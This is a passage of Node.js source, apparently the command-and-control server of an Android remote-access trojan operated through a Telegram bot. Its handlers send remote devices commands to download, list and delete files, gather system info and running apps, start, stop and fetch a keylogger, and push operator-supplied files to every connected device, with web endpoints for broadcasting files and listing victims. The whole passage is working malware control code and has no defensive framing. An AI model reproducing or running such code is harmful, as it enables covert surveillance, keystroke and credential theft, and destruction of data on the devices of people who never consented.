                `Enter file path to download from device:\n` +
                `Example: \`/sdcard/Download/file.txt\``,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        keyboard: [['🔙 Back to Main']],
                        resize_keyboard: true
                    }
                }
            );
            const downListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', downListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                broadcastToAll('message', {
                    request: 'downloadFile',
                    extras: { path: msg.text },
                    from: 'telegram',
                    requestId: `down_${Date.now()}`
                });
                bot.sendMessage(chatId, `⬇️ Downloading ${msg.text}...`, { ...getMainKeyboard() });
                bot.removeListener('message', downListener);
            };
            bot.on('message', downListener);
            break;

        case '🗑️ Delete':
            bot.sendMessage(chatId,
                `🗑️ *Delete File*\n\n` +
                `⚠️ This will permanently delete the file!\n` +
                `Enter file path:\n` +
                `Example: \`/sdcard/Download/file.txt\``,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        keyboard: [
                            ['✅ Confirm Delete', '❌ Cancel'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            const delListener = (msg) => {
                if (msg.text === '🔙 Back to Main' || msg.text === '❌ Cancel') {
                    bot.removeListener('message', delListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                if (msg.text === '✅ Confirm Delete') {
                    bot.sendMessage(chatId, `🗑️ Enter path to delete:`, {
                        reply_markup: {
                            keyboard: [['🔙 Back to Main']],
                            resize_keyboard: true
                        }
                    });
                    const delPathListener = (msg2) => {
                        if (msg2.text === '🔙 Back to Main') {
                            bot.removeListener('message', delPathListener);
                            bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                            return;
                        }
                        broadcastToAll('message', {
                            request: 'deleteFile',
                            extras: { path: msg2.text },
                            from: 'telegram',
                            requestId: `del_${Date.now()}`
                        });
                        bot.sendMessage(chatId, `🗑️ Deleting ${msg2.text}...`, { ...getMainKeyboard() });
                        bot.removeListener('message', delPathListener);
                    };
                    bot.on('message', delPathListener);
                }
                bot.removeListener('message', delListener);
            };
            bot.on('message', delListener);
            break;

        case '📂 List Files':
            bot.sendMessage(chatId,
                `📂 *List Files*\n\n` +
                `Enter directory path:\n` +
                `Example: \`/sdcard/Download\``,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        keyboard: [['🔙 Back to Main']],
                        resize_keyboard: true
                    }
                }
            );
            const listListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', listListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                broadcastToAll('message', {
                    request: 'listFiles',
                    extras: { path: msg.text },
                    from: 'telegram',
                    requestId: `list_${Date.now()}`
                });
                bot.sendMessage(chatId, `📂 Listing files in ${msg.text}...`, { ...getMainKeyboard() });
                bot.removeListener('message', listListener);
            };
            bot.on('message', listListener);
            break;

        case '⚙️ System Info':
            broadcastToAll('message', {
                request: 'systemInfo',
                extras: {},
                from: 'telegram',
                requestId: `sys_${Date.now()}`
            });
            bot.sendMessage(chatId, '⚙️ Fetching system info...', { ...getMainKeyboard() });
            break;

        case '📱 Running Apps':
            broadcastToAll('message', {
                request: 'runningApps',
                extras: {},
                from: 'telegram',
                requestId: `apps_${Date.now()}`
            });
            bot.sendMessage(chatId, '📱 Fetching running apps...', { ...getMainKeyboard() });
            break;

        case '🧹 Clear Cache':
            broadcastToAll('message', {
                request: 'clearCache',
                extras: {},
                from: 'telegram',
                requestId: `cache_${Date.now()}`
            });
            bot.sendMessage(chatId, '🧹 Clearing cache...', { ...getMainKeyboard() });
            break;

        case '🔐 Keylogger':
            bot.sendMessage(chatId,
                `🔐 *Keylogger Control*\n\n` +
                `⚠️ This feature logs keystrokes!\n` +
                `Choose action:`,
                {
                    reply_markup: {
                        keyboard: [
                            ['▶️ Start Keylogger', '⏹️ Stop Keylogger'],
                            ['📊 Get Keylogs'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            const keylogListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', keylogListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                const actionMap = {
                    '▶️ Start Keylogger': 'startKeylogger',
                    '⏹️ Stop Keylogger': 'stopKeylogger',
                    '📊 Get Keylogs': 'getKeylogs'
                };
                if (actionMap[msg.text]) {
                    broadcastToAll('message', {
                        request: actionMap[msg.text],
                        extras: {},
                        from: 'telegram',
                        requestId: `key_${Date.now()}`
                    });
                    bot.sendMessage(chatId, `🔐 ${msg.text}...`, { ...getMainKeyboard() });
                }
                bot.removeListener('message', keylogListener);
            };
            bot.on('message', keylogListener);
            break;

        case '📱 Remote Control':
            // This opens a more detailed submenu
            bot.sendMessage(chatId,
                `📱 *Remote Control Panel*\n\n` +
                `Choose a device to control:`,
                getDeviceSelectionKeyboard(connectedDevices)
            );
            break;

        case '🔙 Back to Main':
            bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
            break;

        default:
            // Check if it's a device selection
            if (text.includes('Select Device')) {
                // This is handled by the callback query
            } else {
                bot.sendMessage(chatId, 
                    `❌ Unknown command: ${text}\n` +
                    `Use the buttons or type /help for available commands`,
                    { ...getMainKeyboard() }
                );
            }
    }
});

// --- Callback Query Handler for Device Selection ---
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    
    if (data === 'main_menu') {
        bot.answerCallbackQuery(query.id);
        bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
        return;
    }
    
    if (data.startsWith('device_')) {
        const deviceId = data.replace('device_', '');
        if (deviceId === 'all') {
            appData.delete(`selected_${chatId}`);
            bot.answerCallbackQuery(query.id, '📡 All devices selected');
            bot.sendMessage(chatId, '📡 *All Devices Selected*\n\nCommands will be sent to all connected devices.', {
                parse_mode: 'Markdown',
                ...getMainKeyboard()
            });
        } else {
            appData.set(`selected_${chatId}`, deviceId);
            bot.answerCallbackQuery(query.id, `📱 Selected: ${deviceId}`);
            bot.sendMessage(chatId, `📱 *Device Selected: ${deviceId}*\n\nCommands will be sent only to this device.`, {
                parse_mode: 'Markdown',
                ...getMainKeyboard()
            });
        }
    }
});

// --- Document Upload Handler ---
bot.on('document', (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    
    const fileId = msg.document.file_id;
    const fileName = msg.document.file_name || 'file.bin';
    
    bot.sendMessage(chatId, `📤 Uploading ${fileName} to devices...`, { ...getMainKeyboard() });
    
    // Get file from Telegram
    bot.getFile(fileId).then((file) => {
        const filePath = file.file_path;
        const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`;
        
        // Download file
        const https = require('https');
        https.get(url, (response) => {
            const chunks = [];
            response.on('data', (chunk) => chunks.push(chunk));
            response.on('end', () => {
                const data = Buffer.concat(chunks);
                const base64 = data.toString('base64');
                
                broadcastToAll('message', {
                    request: 'uploadFile',
                    extras: {
                        filename: fileName,
                        size: data.length,
                        data: base64
                    },
                    from: 'telegram',
                    requestId: `up_${Date.now()}`
                });
                bot.sendMessage(chatId, `📤 ${fileName} uploaded to devices!`, { ...getMainKeyboard() });
            });
        });
    }).catch((err) => {
        console.error('File upload error:', err);
        bot.sendMessage(chatId, `❌ Failed to upload file: ${err.message}`, { ...getMainKeyboard() });
    });
});

// --- Web Upload Endpoint ---
app.post('/upload', upload.single('file'), (req, res) => {
    try {
        const file = req.file;
        if (!file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }

        broadcastToAll('message', {
            request: 'uploadFile',
            extras: {
                filename: file.originalname,
                size: file.size,
                data: file.buffer.toString('base64'),
                caption: req.body.caption || ''
            },
            from: 'web',
            requestId: `up_${Date.now()}`
        });

        bot.sendMessage(BOT_CHAT_ID, `📤 File broadcasted: ${file.originalname}`, { ...getMainKeyboard() });
        res.json({ success: true, message: 'File broadcasted' });
    } catch (e) {
        console.error('Upload error:', e);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// --- Web Status Endpoint ---
app.get('/status', (req, res) => {
    const status = {
        devices: connectedDevices.size,
        connectedDevices: Array.from(connectedDevices.values()),
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    };
    res.json(status);
});

// --- Start Server ---
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📱 Connected devices: ${connectedDevices.size}`);
    console.log('🤖 Bot is ready!');
});

// --- Graceful Shutdown ---
process.on('SIGINT', () => {
    console.log('🛑 Shutting down server...');
    io.close(() => {
        server.close(() => {
            process.exit(0);
        });
    });
});